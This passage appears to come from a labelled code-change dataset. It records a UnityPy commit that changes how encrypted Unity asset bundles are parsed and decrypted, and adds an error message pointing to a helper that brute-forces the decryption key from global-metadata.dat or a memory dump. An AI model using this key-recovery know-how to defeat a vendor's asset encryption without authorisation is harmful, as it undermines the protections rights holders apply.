   return None\n+\n+\n def to_uint4_array(source: bytes, offset: int = 0):\n     buffer = bytearray(len(source) * 2)\n     for j in range(len(source)):\n@@ -46,16 +70,25 @@ class ArchiveStorageDecryptor:\n     substitute: bytes = bytes(0x10)\n \n     def __init__(self, reader: EndianBinaryReader) -> None:\n-        if DECRYPT_KEY is None:\n-            raise LookupError(\n-                \"The BundleFile is encrypted, but no key was provided!\\nYou can set the key via UnityPy.set_assetbundle_decrypt_key(key)\"\n-            )\n         self.unknown_1 = reader.read_u_int()\n \n         # read vector data\/key vectors\n         self.data, self.key = read_vector(reader)\n         self.data_sig, self.key_sig = read_vector(reader)\n \n+        if DECRYPT_KEY is None:\n+            raise LookupError(\n+                \"\\n\".join(\n+                    [\n+                        \"The BundleFile is encrypted, but no key was provided!\",\n+                        \"You can set the key via UnityPy.set_assetbundle_decrypt_key(key).\",\n+                        \"To try brute-forcing the key, use UnityPy.helpers.ArchiveStorageManager.brute_force_key(fp, key_sig, data_sig)\",\n+                        f\"with  key_sig = {self.key_sig}, data_sig = {self.data_sig},\"\n+                        \"and fp being the path to global-metadata.dat or a memory dump.\",\n+                    ]\n+                )\n+            )\n+\n         signature = decrypt_key(self.key_sig, self.data_sig, DECRYPT_KEY)\n         if signature != UNITY3D_SIGNATURE:\n             raise Exception(f\"Invalid signature {signature} != {UNITY3D_SIGNATURE}\")\n","files":{"\/UnityPy\/__init__.py":{"changes":[{"diff":"\n-__version__ = \"1.9.24\"\n+__version__ = \"1.9.25\"\n \n from .environment import Environment\n from .helpers.ArchiveStorageManager import set_assetbundle_decrypt_key","add":1,"remove":1,"filename":"\/UnityPy\/__init__.py","badparts":["__version__ = \"1.9.24\""],"goodparts":["__version__ = \"1.9.25\""]}],"source":"\n__version__=\"1.9.24\" from.environment import Environment from.helpers.ArchiveStorageManager import set_assetbundle_decrypt_key def load(*args): return Environment(*args) AssetsManager=Environment ","sourceWithComments":"__version__ = \"1.9.24\"\n\nfrom .environment import Environment\nfrom .helpers.ArchiveStorageManager import set_assetbundle_decrypt_key\n\n\ndef load(*args):\n    return Environment(*args)\n\n\n# backward compatibility\nAssetsManager = Environment\n"},"\/UnityPy\/files\/BundleFile.py":{"changes":[{"diff":"\n # TODO: implement encryption for saving files\n from collections import namedtuple\n import re\n-from typing import Tuple\n+from typing import Tuple, Union\n \n from . import File\n from ..enums import ArchiveFlags, ArchiveFlagsOld, CompressionFlags\n","add":1,"remove":1,"filename":"\/UnityPy\/files\/BundleFile.py","badparts":["from typing import Tuple"],"goodparts":["from typing import Tuple, Union"]},{"diff":"\n             blocksInfoBytes = reader.read_bytes(compressedSize)\n             reader.Position = start\n         else:  # 0x40 kArchiveBlocksAndDirectoryInfoCombined\n-            if self.dataflags & self.dataflags.UsesAssetBundleEncryption:\n-                self.decryptor = ArchiveStorageManager.ArchiveStorageDecryptor(reader)\n             blocksInfoBytes = reader.read_bytes(compressedSize)\n \n         blocksInfoBytes = self.decompress_data(\n","add":0,"remove":2,"filename":"\/UnityPy\/files\/BundleFile.py","badparts":["            if self.dataflags & self.dataflags.UsesAssetBundleEncryption:","                self.decryptor = ArchiveStorageManager.ArchiveStorageDecryptor(reader)"],"goodparts":[]},{"diff":"\n         writer.Position = writer_end_pos\n \n     def decompress_data(\n-        self, compressed_data: bytes, uncompressed_size: int, flags: int, index: int = 0\n+        self,\n+        compressed_data: bytes,\n+        uncompressed_size: int,\n+        flags: Union[int, ArchiveFlags, ArchiveFlagsOld],\n+        index: int = 0,\n     ) -> bytes:\n         \"\"\"\n         Parameters\n","add":5,"remove":1,"filename":"\/UnityPy\/files\/BundleFile.py","badparts":["        self, compressed_data: bytes, uncompressed_size: int, flags: int, index: int = 0"],"goodparts":["        self,","        compressed_data: bytes,","        uncompressed_size: int,","        flags: Union[int, ArchiveFlags, ArchiveFlagsOld],","        index: int = 0,"]},{"diff":"\n         -------\n         bytes\n             The decompressed data.\"\"\"\n-        comp_flag = flags & ArchiveFlags.CompressionTypeMask\n+        comp_flag = CompressionFlags(flags & ArchiveFlags.CompressionTypeMask)\n \n         if comp_flag == CompressionFlags.LZMA:  # LZMA\n             return CompressionHelper.decompress_lzma(compressed_data","add":1,"remove":1,"filename":"\/UnityPy\/files\/BundleFile.py","badparts":["------","        comp_flag = flags & ArchiveFlags.CompressionTypeMask"],"goodparts":["        comp_flag = CompressionFlags(flags & ArchiveFlags.CompressionTypeMask)"]}],"source":"\n\nfrom collections import namedtuple import re from typing import Tuple from. import File from..enums import ArchiveFlags, ArchiveFlagsOld, CompressionFlags from..helpers import ArchiveStorageManager, CompressionHelper from..streams import EndianBinaryReader, EndianBinaryWriter from.. import config BlockInfo=namedtuple(\"BlockInfo\", \"uncompressedSize compressedSize flags\") DirectoryInfoFS=namedtuple(\"DirectoryInfoFS\", \"offset size flags path\") reVersion=re.compile(r\"(\\d+)\\.(\\d+)\\.(\\d+)\\w.+\") class BundleFile(File.File): format: int is_changed: bool signature: str version_engine: str version_player: str dataflags: Tuple[ArchiveFlags, ArchiveFlagsOld] decryptor: ArchiveStorageManager.ArchiveStorageDecryptor=None def __init__(self, reader: EndianBinaryReader, parent: File, name: str=None): super().__init__(parent=parent, name=name) signature=self.signature=reader.read_string_to_null() self.version=reader.read_u_int() self.version_player=reader.read_string_to_null() self.version_engine=reader.read_string_to_null() if signature==\"UnityArchive\": raise NotImplementedError(\"BundleFile -UnityArchive\") elif signature in[\"UnityWeb\", \"UnityRaw\"]: m_DirectoryInfo, blocksReader=self.read_web_raw(reader) elif signature==\"UnityFS\": m_DirectoryInfo, blocksReader=self.read_fs(reader) else: raise NotImplementedError(f\"Unknown Bundle signature:{signature}\") self.read_files(blocksReader, m_DirectoryInfo) def read_web_raw(self, reader: EndianBinaryReader): version=self.version if version >=4: _hash=reader.read_bytes(16) crc=reader.read_u_int() minimumStreamedBytes=reader.read_u_int() headerSize=reader.read_u_int() numberOfLevelsToDownloadBeforeStreaming=reader.read_u_int() levelCount=reader.read_int() reader.Position +=4 * 2 *(levelCount -1) compressedSize=reader.read_u_int() uncompressedSize=reader.read_u_int() if version >=2: completeFileSize=reader.read_u_int() if version >=3: fileInfoHeaderSize=reader.read_u_int() reader.Position=headerSize uncompressedBytes=CompressionHelper.decompress_lzma( reader.read_bytes(compressedSize) ) blocksReader=EndianBinaryReader(uncompressedBytes, offset=headerSize) nodesCount=blocksReader.read_int() m_DirectoryInfo=[ File.DirectoryInfo( blocksReader.read_string_to_null(), blocksReader.read_u_int(), blocksReader.read_u_int(), ) for _ in range(nodesCount) ] return m_DirectoryInfo, blocksReader def read_fs(self, reader: EndianBinaryReader): size=reader.read_long() compressedSize=reader.read_u_int() uncompressedSize=reader.read_u_int() self.dataflags=reader.read_u_int() version=self.get_version_tuple() if( version <(2020,) or(version[0]==2020 and version <(2020, 3, 34)) or(version[0]==2021 and version <(2021, 3, 2)) or(version[0]==2022 and version <(2022, 1, 1)) ): self.dataflags=ArchiveFlagsOld(self.dataflags) else: self.dataflags=ArchiveFlags(self.dataflags) if self.version >=7: reader.align_stream(16) start=reader.Position if( self.dataflags & ArchiveFlags.BlocksInfoAtTheEnd ): reader.Position=reader.Length -compressedSize blocksInfoBytes=reader.read_bytes(compressedSize) reader.Position=start else: if self.dataflags & self.dataflags.UsesAssetBundleEncryption: self.decryptor=ArchiveStorageManager.ArchiveStorageDecryptor(reader) blocksInfoBytes=reader.read_bytes(compressedSize) blocksInfoBytes=self.decompress_data( blocksInfoBytes, uncompressedSize, self.dataflags ) blocksInfoReader=EndianBinaryReader(blocksInfoBytes, offset=start) uncompressedDataHash=blocksInfoReader.read_bytes(16) blocksInfoCount=blocksInfoReader.read_int() m_BlocksInfo=[ BlockInfo( blocksInfoReader.read_u_int(), blocksInfoReader.read_u_int(), blocksInfoReader.read_u_short(), ) for _ in range(blocksInfoCount) ] nodesCount=blocksInfoReader.read_int() m_DirectoryInfo=[ DirectoryInfoFS( blocksInfoReader.read_long(), blocksInfoReader.read_long(), blocksInfoReader.read_u_int(), blocksInfoReader.read_string_to_null(), ) for _ in range(nodesCount) ] if m_BlocksInfo: self._block_info_flags=m_BlocksInfo[0].flags if( isinstance(self.dataflags, ArchiveFlags) and self.dataflags & ArchiveFlags.BlockInfoNeedPaddingAtStart ): reader.align_stream(16) blocksReader=EndianBinaryReader( b\"\".join( self.decompress_data( reader.read_bytes(blockInfo.compressedSize), blockInfo.uncompressedSize, blockInfo.flags, i, ) for i, blockInfo in enumerate(m_BlocksInfo) ), offset=(blocksInfoReader.real_offset()), ) return m_DirectoryInfo, blocksReader def save(self, packer=None): \"\"\" Rewrites the BundleFile and returns it as bytes object. packer: can be either one of the following strings or tuple consisting of(block_info_flag, data_flag) allowed strings: none -no compression, default, safest bet lz4 -lz4 compression original -uses the original flags \"\"\" writer=EndianBinaryWriter() writer.write_string_to_null(self.signature) writer.write_u_int(self.version) writer.write_string_to_null(self.version_player) writer.write_string_to_null(self.version_engine) if self.signature==\"UnityArchive\": raise NotImplementedError(\"BundleFile -UnityArchive\") elif self.signature in[\"UnityWeb\", \"UnityRaw\"]: raise NotImplementedError( \"Saving Unity Web and Raw bundles isn't supported yet\" ) elif self.signature==\"UnityFS\": if not packer or packer==\"none\": self.save_fs(writer, 64, 64) elif packer==\"original\": self.save_fs( writer, data_flag=self._data_flags, block_info_flag=self._block_info_flags, ) elif packer==\"lz4\": self.save_fs(writer, data_flag=194, block_info_flag=2) elif isinstance(packer, tuple): self.save_fs(writer, *packer) else: raise NotImplementedError(\"UnityFS -Packer:\", packer) return writer.bytes def save_fs(self, writer: EndianBinaryWriter, data_flag: int, block_info_flag: int): data_writer=EndianBinaryWriter() files=[ ( name, f.flags, data_writer.write_bytes( f.bytes if isinstance(f,(EndianBinaryReader, EndianBinaryWriter)) else f.save() ), ) for name, f in self.files.items() ] file_data=data_writer.bytes data_writer.dispose() uncompressed_data_size=len(file_data) switch=block_info_flag & 0x3F if switch==1: file_data=CompressionHelper.compress_lzma(file_data) elif switch in[2, 3]: file_data=CompressionHelper.compress_lz4(file_data) elif switch==4: raise NotImplementedError compressed_data_size=len(file_data) block_writer=EndianBinaryWriter(b\"\\x00\" * 0x10) block_writer.write_int(1) block_writer.write_u_int(uncompressed_data_size) block_writer.write_u_int(compressed_data_size) block_writer.write_u_short(block_info_flag) if not data_flag & 0x40: raise NotImplementedError( \"UnityPy always writes DirectoryInfo, so data_flag must include 0x40\" ) block_writer.write_int(len(files)) offset=0 for f_name, f_flag, f_len in files: block_writer.write_long(offset) block_writer.write_long(f_len) offset +=f_len block_writer.write_u_int(f_flag) block_writer.write_string_to_null(f_name) block_data=block_writer.bytes block_writer.dispose() uncompressed_block_data_size=len(block_data) switch=data_flag & 0x3F if switch==1: block_data=CompressionHelper.compress_lzma(block_data) elif switch in[2, 3]: block_data=CompressionHelper.compress_lz4(block_data) elif switch==4: raise NotImplementedError compressed_block_data_size=len(block_data) writer_header_pos=writer.Position writer.write_long(0) writer.write_u_int(compressed_block_data_size) writer.write_u_int(uncompressed_block_data_size) writer.write_u_int(data_flag) if self.version >=7: writer.align_stream(16) if data_flag & 0x80: if data_flag & 0x200: writer.align_stream(16) writer.write(file_data) writer.write(block_data) else: writer.write(block_data) if data_flag & 0x200: writer.align_stream(16) writer.write(file_data) writer_end_pos=writer.Position writer.Position=writer_header_pos writer.write_long(writer_end_pos) writer.Position=writer_end_pos def decompress_data( self, compressed_data: bytes, uncompressed_size: int, flags: int, index: int=0 ) -> bytes: \"\"\" Parameters ---------- compressed_data: bytes The compressed data. uncompressed_size: int The uncompressed size of the data. flags: int The flags of the data. Returns ------- bytes The decompressed data.\"\"\" comp_flag=flags & ArchiveFlags.CompressionTypeMask if comp_flag==CompressionFlags.LZMA: return CompressionHelper.decompress_lzma(compressed_data) elif comp_flag in[CompressionFlags.LZ4, CompressionFlags.LZ4HC]: if flags & 0x100: compressed_data=self.decryptor.decrypt_block(compressed_data, index) return CompressionHelper.decompress_lz4(compressed_data, uncompressed_size) elif comp_flag==CompressionFlags.LZHAM: raise NotImplementedError(\"LZHAM decompression not implemented\") else: return compressed_data def get_version_tuple(self) -> Tuple[int, int, int]: \"\"\"Returns the version as a tuple.\"\"\" version=self.version_engine if not version or version==\"0.0.0\": version=config.get_fallback_version() return tuple(map(int, reVersion.match(version).groups())) ","sourceWithComments":"# TODO: implement encryption for saving files\nfrom collections import namedtuple\nimport re\nfrom typing import Tuple\n\nfrom . import File\nfrom ..enums import ArchiveFlags, ArchiveFlagsOld, CompressionFlags\nfrom ..helpers import ArchiveStorageManager, CompressionHelper\nfrom ..streams import EndianBinaryReader, EndianBinaryWriter\n\nfrom .. import config\n\nBlockInfo = namedtuple(\"BlockInfo\", \"uncompressedSize compressedSize flags\")\nDirectoryInfoFS = namedtuple(\"DirectoryInfoFS\", \"offset size flags path\")\nreVersion = re.compile(r\"(\\d+)\\.(\\d+)\\.(\\d+)\\w.+\")\n\n\nclass BundleFile(File.File):\n    format: int\n    is_changed: bool\n    signature: str\n    version_engine: str\n    version_player: str\n    dataflags: Tuple[ArchiveFlags, ArchiveFlagsOld]\n    decryptor: ArchiveStorageManager.ArchiveStorageDecryptor = None\n\n    def __init__(self, reader: EndianBinaryReader, parent: File, name: str = None):\n        super().__init__(parent=parent, name=name)\n        signature = self.signature = reader.read_string_to_null()\n        self.version = reader.read_u_int()\n        self.version_player = reader.read_string_to_null()\n        self.version_engine = reader.read_string_to_null()\n\n        if signature == \"UnityArchive\":\n            raise NotImplementedError(\"BundleFile - UnityArchive\")\n        elif signature in [\"UnityWeb\", \"UnityRaw\"]:\n            m_DirectoryInfo, blocksReader = self.read_web_raw(reader)\n        elif signature == \"UnityFS\":\n            m_DirectoryInfo, blocksReader = self.read_fs(reader)\n        else:\n            raise NotImplementedError(f\"Unknown Bundle signature: {signature}\")\n\n        self.read_files(blocksReader, m_DirectoryInfo)\n\n    def read_web_raw(self, reader: EndianBinaryReader):\n        # def read_header_and_blocks_info(self, reader:EndianBinaryReader):\n        version = self.version\n        if version >= 4:\n            _hash = reader.read_bytes(16)\n            crc = reader.read_u_int()\n\n        minimumStreamedBytes = reader.read_u_int()\n        headerSize = reader.read_u_int()\n        numberOfLevelsToDownloadBeforeStreaming = reader.read_u_int()\n        levelCount = reader.read_int()\n        reader.Position += 4 * 2 * (levelCount - 1)\n\n        compressedSize = reader.read_u_int()\n        uncompressedSize = reader.read_u_int()\n\n        if version >= 2:\n            completeFileSize = reader.read_u_int()\n\n        if version >= 3:\n            fileInfoHeaderSize = reader.read_u_int()\n\n        reader.Position = headerSize\n\n        uncompressedBytes = CompressionHelper.decompress_lzma(\n            reader.read_bytes(compressedSize)\n        )\n\n        blocksReader = EndianBinaryReader(uncompressedBytes, offset=headerSize)\n        nodesCount = blocksReader.read_int()\n        m_DirectoryInfo = [\n            File.DirectoryInfo(\n                blocksReader.read_string_to_null(),  # path\n                blocksReader.read_u_int(),  # offset\n                blocksReader.read_u_int(),  # size\n            )\n            for _ in range(nodesCount)\n        ]\n\n        return m_DirectoryInfo, blocksReader\n\n    def read_fs(self, reader: EndianBinaryReader):\n        size = reader.read_long()\n\n        # header\n        compressedSize = reader.read_u_int()\n        uncompressedSize = reader.read_u_int()\n        self.dataflags = reader.read_u_int()\n\n        version = self.get_version_tuple()\n        # https:\/\/issuetracker.unity3d.com\/issues\/files-within-assetbundles-do-not-start-on-aligned-boundaries-breaking-patching-on-nintendo-switch\n        # Unity CN introduced encryption before the alignment fix was introduced.\n        # Unity CN used the same flag for the encryption as later on the alignment fix,\n        # so we have to check the version to determine the correct flag set.\n        if (\n            version < (2020,)\n            or (version[0] == 2020 and version < (2020, 3, 34))\n            or (version[0] == 2021 and version < (2021, 3, 2))\n            or (version[0] == 2022 and version < (2022, 1, 1))\n        ):\n            self.dataflags = ArchiveFlagsOld(self.dataflags)\n        else:\n            self.dataflags = ArchiveFlags(self.dataflags)\n\n        if self.version >= 7:\n            reader.align_stream(16)\n\n        start = reader.Position\n        if (\n            self.dataflags & ArchiveFlags.BlocksInfoAtTheEnd\n        ):  # kArchiveBlocksInfoAtTheEnd\n            reader.Position = reader.Length - compressedSize\n            blocksInfoBytes = reader.read_bytes(compressedSize)\n            reader.Position = start\n        else:  # 0x40 kArchiveBlocksAndDirectoryInfoCombined\n            if self.dataflags & self.dataflags.UsesAssetBundleEncryption:\n                self.decryptor = ArchiveStorageManager.ArchiveStorageDecryptor(reader)\n            blocksInfoBytes = reader.read_bytes(compressedSize)\n\n        blocksInfoBytes = self.decompress_data(\n            blocksInfoBytes, uncompressedSize, self.dataflags\n        )\n        blocksInfoReader = EndianBinaryReader(blocksInfoBytes, offset=start)\n\n        uncompressedDataHash = blocksInfoReader.read_bytes(16)\n        blocksInfoCount = blocksInfoReader.read_int()\n\n        m_BlocksInfo = [\n            BlockInfo(\n                blocksInfoReader.read_u_int(),  # uncompressedSize\n                blocksInfoReader.read_u_int(),  # compressedSize\n                blocksInfoReader.read_u_short(),  # flags\n            )\n            for _ in range(blocksInfoCount)\n        ]\n\n        nodesCount = blocksInfoReader.read_int()\n        m_DirectoryInfo = [\n            DirectoryInfoFS(\n                blocksInfoReader.read_long(),  # offset\n                blocksInfoReader.read_long(),  # size\n                blocksInfoReader.read_u_int(),  # flags\n                blocksInfoReader.read_string_to_null(),  # path\n            )\n            for _ in range(nodesCount)\n        ]\n\n        if m_BlocksInfo:\n            self._block_info_flags = m_BlocksInfo[0].flags\n\n        if (\n            isinstance(self.dataflags, ArchiveFlags)\n            and self.dataflags & ArchiveFlags.BlockInfoNeedPaddingAtStart\n        ):\n            reader.align_stream(16)\n\n        blocksReader = EndianBinaryReader(\n            b\"\".join(\n                self.decompress_data(\n                    reader.read_bytes(blockInfo.compressedSize),\n                    blockInfo.uncompressedSize,\n                    blockInfo.flags,\n                    i,\n                )\n                for i, blockInfo in enumerate(m_BlocksInfo)\n            ),\n            offset=(blocksInfoReader.real_offset()),\n        )\n\n        return m_DirectoryInfo, blocksReader\n\n    def save(self, packer=None):\n        \"\"\"\n        Rewrites the BundleFile and returns it as bytes object.\n\n        packer:\n            can be either one of the following strings\n            or tuple consisting of (block_info_flag, data_flag)\n            allowed strings:\n                none - no compression, default, safest bet\n                lz4 - lz4 compression\n                original - uses the original flags\n        \"\"\"\n        # file_header\n        #     signature    (string_to_null)\n        #     format        (int)\n        #     version_player    (string_to_null)\n        #     version_engine    (string_to_null)\n        writer = EndianBinaryWriter()\n\n        writer.write_string_to_null(self.signature)\n        writer.write_u_int(self.version)\n        writer.write_string_to_null(self.version_player)\n        writer.write_string_to_null(self.version_engine)\n\n        if self.signature == \"UnityArchive\":\n            raise NotImplementedError(\"BundleFile - UnityArchive\")\n        elif self.signature in [\"UnityWeb\", \"UnityRaw\"]:\n            raise NotImplementedError(\n                \"Saving Unity Web and Raw bundles isn't supported yet\"\n            )\n            # self.save_web_raw(writer)\n        elif self.signature == \"UnityFS\":\n            if not packer or packer == \"none\":\n                self.save_fs(writer, 64, 64)\n            elif packer == \"original\":\n                self.save_fs(\n                    writer,\n                    data_flag=self._data_flags,\n                    block_info_flag=self._block_info_flags,\n                )\n            elif packer == \"lz4\":\n                self.save_fs(writer, data_flag=194, block_info_flag=2)\n            elif isinstance(packer, tuple):\n                self.save_fs(writer, *packer)\n            else:\n                raise NotImplementedError(\"UnityFS - Packer:\", packer)\n        return writer.bytes\n\n    def save_fs(self, writer: EndianBinaryWriter, data_flag: int, block_info_flag: int):\n        # header\n        # compressed blockinfo (block details & directionary)\n        # compressed assets\n\n        # 0b1000000 \/ 0b11000000 | 64 \/ 192 - uncompressed\n        # 0b11000010 | 194 - lz4\n        # block_info_flag\n\n        # 0 \/ 0b1000000 | 0 \/ 64 - uncompressed\n        # 0b1   | 1 - lzma\n        # 0b10  | 2 - lz4\n        # 0b11  | 3 - lz4hc [not implemented]\n        # 0b100 | 4 - lzham [not implemented]\n        # data_flag\n\n        # header:\n        #     bundle_size        (long)\n        #     compressed_size    (int)\n        #     uncompressed_size    (int)\n        #     flag                (int)\n        #     ?padding?            (bool)\n        #   This will be written at the end,\n        #   because the size can only be calculated after the data compression,\n\n        # block_info:\n        #     *flag & 0x80 ? at the end : right after header\n        #     *decompression via flag & 0x3F\n        #     *read compressed_size -> uncompressed_size\n        #     0x10 offset\n        #     *read blocks infos of the data stream\n        #     count            (int)\n        #     (\n        #         uncompressed_size(uint)\n        #         compressed_size (uint)\n        #         flag(short)\n        #     )\n        #     *decompression via info.flag & 0x3F\n\n        #     *afterwards the file positions\n        #     file_count        (int)\n        #     (\n        #         offset    (long)\n        #         size        (long)\n        #         flag        (int)\n        #         name        (string_to_null)\n        #     )\n\n        # file list & file data\n        # prep nodes and build up block data\n        data_writer = EndianBinaryWriter()\n        files = [\n            (\n                name,\n                f.flags,\n                data_writer.write_bytes(\n                    f.bytes\n                    if isinstance(f, (EndianBinaryReader, EndianBinaryWriter))\n                    else f.save()\n                ),\n            )\n            for name, f in self.files.items()\n        ]\n\n        file_data = data_writer.bytes\n        data_writer.dispose()\n        uncompressed_data_size = len(file_data)\n\n        # compress the data\n        switch = block_info_flag & 0x3F\n        if switch == 1:  # LZMA\n            file_data = CompressionHelper.compress_lzma(file_data)\n        elif switch in [2, 3]:  # LZ4, LZ4HC\n            file_data = CompressionHelper.compress_lz4(file_data)\n        elif switch == 4:  # LZHAM\n            raise NotImplementedError\n        # else no compression - data stays the same\n        compressed_data_size = len(file_data)\n\n        # write the block_info\n        # uncompressedDataHash\n        block_writer = EndianBinaryWriter(b\"\\x00\" * 0x10)\n        # data block info\n        # block count\n        block_writer.write_int(1)\n        # uncompressed size\n        block_writer.write_u_int(uncompressed_data_size)\n        # compressed size\n        block_writer.write_u_int(compressed_data_size)\n        # flag\n        block_writer.write_u_short(block_info_flag)\n\n        # file block info\n        if not data_flag & 0x40:\n            raise NotImplementedError(\n                \"UnityPy always writes DirectoryInfo, so data_flag must include 0x40\"\n            )\n        # file count\n        block_writer.write_int(len(files))\n        offset = 0\n        for f_name, f_flag, f_len in files:\n            # offset\n            block_writer.write_long(offset)\n            # size\n            block_writer.write_long(f_len)\n            offset += f_len\n            # flag\n            block_writer.write_u_int(f_flag)\n            # name\n            block_writer.write_string_to_null(f_name)\n\n        # compress the block data\n        block_data = block_writer.bytes\n        block_writer.dispose()\n\n        uncompressed_block_data_size = len(block_data)\n\n        switch = data_flag & 0x3F\n        if switch == 1:  # LZMA\n            block_data = CompressionHelper.compress_lzma(block_data)\n        elif switch in [2, 3]:  # LZ4, LZ4HC\n            block_data = CompressionHelper.compress_lz4(block_data)\n        elif switch == 4:  # LZHAM\n            raise NotImplementedError\n\n        compressed_block_data_size = len(block_data)\n\n        # write the header info\n        ## file size - 0 for now, will be set at the end\n        writer_header_pos = writer.Position\n        writer.write_long(0)\n        # compressed blockInfoBytes size\n        writer.write_u_int(compressed_block_data_size)\n        # uncompressed size\n        writer.write_u_int(uncompressed_block_data_size)\n        # compression and file layout flag\n        writer.write_u_int(data_flag)\n\n        if self.version >= 7:\n            # UnityFS\\x00 - 8\n            # size 8\n            # comp sizes 4+4\n            # flag 4\n            # sum : 28 -> +8 alignment\n            writer.align_stream(16)\n\n        if data_flag & 0x80:  # at end of file\n            if data_flag & 0x200:\n                writer.align_stream(16)\n            writer.write(file_data)\n            writer.write(block_data)\n        else:\n            writer.write(block_data)\n            if data_flag & 0x200:\n                writer.align_stream(16)\n            writer.write(file_data)\n\n        writer_end_pos = writer.Position\n        writer.Position = writer_header_pos\n        # correct file size\n        writer.write_long(writer_end_pos)\n        writer.Position = writer_end_pos\n\n    def decompress_data(\n        self, compressed_data: bytes, uncompressed_size: int, flags: int, index: int = 0\n    ) -> bytes:\n        \"\"\"\n        Parameters\n        ----------\n        compressed_data : bytes\n            The compressed data.\n        uncompressed_size : int\n            The uncompressed size of the data.\n        flags : int\n            The flags of the data.\n\n        Returns\n        -------\n        bytes\n            The decompressed data.\"\"\"\n        comp_flag = flags & ArchiveFlags.CompressionTypeMask\n\n        if comp_flag == CompressionFlags.LZMA:  # LZMA\n            return CompressionHelper.decompress_lzma(compressed_data)\n        elif comp_flag in [CompressionFlags.LZ4, CompressionFlags.LZ4HC]:  # LZ4, LZ4HC\n            if flags & 0x100:\n                compressed_data = self.decryptor.decrypt_block(compressed_data, index)\n            return CompressionHelper.decompress_lz4(compressed_data, uncompressed_size)\n        elif comp_flag == CompressionFlags.LZHAM:  # LZHAM\n            raise NotImplementedError(\"LZHAM decompression not implemented\")\n        else:\n            return compressed_data\n\n    def get_version_tuple(self) -> Tuple[int, int, int]:\n        \"\"\"Returns the version as a tuple.\"\"\"\n        version = self.version_engine\n        if not version or version == \"0.0.0\":\n            version = config.get_fallback_version()\n        return tuple(map(int, reVersion.match(version).groups()))\n"},"\/UnityPy\/helpers\/ArchiveStorageManager.py":{"changes":[{"diff":"\n \n def read_vector(reader: EndianBinaryReader) -> Tuple[bytes, bytes]:\n     data = reader.read_bytes(0x10)\n-    key = reader.read_string_to_null().encode(\"utf-8\", \"surrogateescape\")\n+    key = reader.read_bytes(0x10)\n+    reader.Position += 1\n \n     return data, key\n \n","add":2,"remove":1,"filename":"\/UnityPy\/helpers\/ArchiveStorageManager.py","badparts":["    key = reader.read_string_to_null().encode(\"utf-8\", \"surrogateescape\")"],"goodparts":["    key = reader.read_bytes(0x10)","    reader.Position += 1"]},{"diff":"\n     substitute: bytes = bytes(0x10)\n \n     def __init__(self, reader: EndianBinaryReader) -> None:\n-        if DECRYPT_KEY is None:\n-            raise LookupError(\n-                \"The BundleFile is encrypted, but no key was provided!\\nYou can set the key via UnityPy.set_assetbundle_decrypt_key(key)\"\n-            )\n         self.unknown_1 = reader.read_u_int()\n \n         # read vector data\/key vectors\n         self.data, self.key = read_vector(reader)\n         self.data_sig, self.key_sig = read_vector(reader)\n \n+        if DECRYPT_KEY is None:\n+            raise LookupError(\n+                \"\\n\".join(\n+                    [\n+                        \"The BundleFile is encrypted, but no key was provided!\",\n+                        \"You can set the key via UnityPy.set_assetbundle_decrypt_key(key).\",\n+                        \"To try brute-forcing the key, use UnityPy.helpers.ArchiveStorageManager.brute_force_key(fp, key_sig, data_sig)\",\n+                        f\"with  key_sig = {self.key_sig}, data_sig = {self.data_sig},\"\n+                        \"and fp being the path to global-metadata.dat or a memory dump.\",\n+                    ]\n+                )\n+            )\n+\n         signature = decrypt_key(self.key_sig, self.data_sig, DECRYPT_KEY)\n         if signature != UNITY3D_SIGNATURE:\n             raise Exception(f\"Invalid signature {signature} != {UNITY3D_SIGNATURE}\")\n","add":13,"remove":4,"filename":"\/UnityPy\/helpers\/ArchiveStorageManager.py","badparts":["        if DECRYPT_KEY is None:","            raise LookupError(","                \"The BundleFile is encrypted, but no key was provided!\\nYou can set the key via UnityPy.set_assetbundle_decrypt_key(key)\"","            )"],"goodparts":["        if DECRYPT_KEY is None:","            raise LookupError(","                \"\\n\".join(","                    [","                        \"The BundleFile is encrypted, but no key was provided!\",","                        \"You can set the key via UnityPy.set_assetbundle_decrypt_key(key).\",","                        \"To try brute-forcing the key, use UnityPy.helpers.ArchiveStorageManager.brute_force_key(fp, key_sig, data_sig)\",","                        f\"with  key_sig = {self.key_sig}, data_sig = {self.data_sig},\"","                        \"and fp being the path to global-metadata.dat or a memory dump.\",","                    ]","                )","            )"]}],"source":"\n\nfrom typing import Tuple, Union from..streams import EndianBinaryReader UNITY3D_SIGNATURE=b\" DECRYPT_KEY: bytes=None def set_assetbundle_decrypt_key(key: Union[bytes, str]): if isinstance(key, str): key=key.encode(\"utf-8\", \"surrogateescape\") if len(key) !=16: raise ValueError( f\"AssetBundle Key length is wrong. It should be 16 bytes and now is{len(key)} bytes.\" ) global DECRYPT_KEY DECRYPT_KEY=key def read_vector(reader: EndianBinaryReader) -> Tuple[bytes, bytes]: data=reader.read_bytes(0x10) key=reader.read_string_to_null().encode(\"utf-8\", \"surrogateescape\") return data, key def decrypt_key(key: bytes, data: bytes, keybytes: bytes): from Crypto.Cipher import AES key=AES.new(keybytes, AES.MODE_ECB).encrypt(key) return bytes(x ^ y for x, y in zip(data, key)) def to_uint4_array(source: bytes, offset: int=0): buffer=bytearray(len(source) * 2) for j in range(len(source)): buffer[j * 2]=source[offset +j] >> 4 buffer[j * 2 +1]=source[offset +j] & 15 return buffer class ArchiveStorageDecryptor: unknown_1: int index: bytes substitute: bytes=bytes(0x10) def __init__(self, reader: EndianBinaryReader) -> None: if DECRYPT_KEY is None: raise LookupError( \"The BundleFile is encrypted, but no key was provided!\\nYou can set the key via UnityPy.set_assetbundle_decrypt_key(key)\" ) self.unknown_1=reader.read_u_int() self.data, self.key=read_vector(reader) self.data_sig, self.key_sig=read_vector(reader) signature=decrypt_key(self.key_sig, self.data_sig, DECRYPT_KEY) if signature !=UNITY3D_SIGNATURE: raise Exception(f\"Invalid signature{signature} !={UNITY3D_SIGNATURE}\") data=decrypt_key(self.key, self.data, DECRYPT_KEY) data=to_uint4_array(data) self.index=data[:0x10] self.substitute=bytes( data[0x10 +i * 4 +j] for j in range(4) for i in range(4) ) def decrypt_block(self, data: bytes, index: int): offset=0 size=len(data) data=bytearray(data) view=memoryview(data) while offset < len(data): offset +=self.decrypt(view[offset:], index, size -offset) index +=1 return data def decrypt_byte(self, view: bytearray, offset: int, index: int): b=( self.substitute[((index >> 2) & 3) +4] +self.substitute[index & 3] +self.substitute[((index >> 4) & 3) +8] +self.substitute[(index % 256 >> 6) +12] ) view[offset]=( (self.index[view[offset] & 0xF] -b) & 0xF | 0x10 *(self.index[view[offset] >> 4] -b) ) % 256 b=view[offset] return b, offset +1, index +1 def decrypt(self, data: bytearray, index: int, remaining: int): offset=0 curByte, offset, 